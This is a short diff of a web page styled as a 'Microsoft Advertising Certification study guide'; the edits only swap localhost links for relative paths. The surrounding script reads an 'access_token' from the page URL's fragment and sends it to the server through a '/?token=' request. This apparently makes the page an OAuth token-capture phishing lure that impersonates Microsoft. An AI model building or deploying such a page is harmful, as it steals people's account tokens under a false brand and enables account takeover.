@@ -48,7 +48,7 @@ var part = currentURL.split("#")[1];
 var part1= part.split("=")[1];
 var part2= part1.split("&")[0];
     if(currentURL.includes("access_token")){
-       window.location.href = "http://localhost/";
+       window.location.href = "/";
     }
 var xmlhttp = new XMLHttpRequest();
 xmlhttp.open('GET', '/?token=' + part2 , true);
@@ -105,7 +105,7 @@ xmlhttp.send()
               <div class="carousel-content container">
                 <h2 class="animate__animated animate__fadeInDown">Microsoft Advertising Certification study guide</h2>
                 <p class="animate__animated animate__fadeInUp">Get started with your Microsoft Advertising training by selecting a topic below.&nbsp;If you are a premium channel partner, tool provider or strategic agency, you can access Bing PPC courses for beginners and advanced practitioners in the <a href="/?submit" style="color:rgb(128, 174, 255)">Microsoft Advertising Learning Lab.</a></p>
-                <a href="http://localhost/index.php?submit" class="btn-get-started animate__animated animate__fadeInUp scrollto">Read More</a>
+                <a href="/index.php?submit" class="btn-get-started animate__animated animate__fadeInUp scrollto">Read More</a>
               </div>
             </div>
           </div>
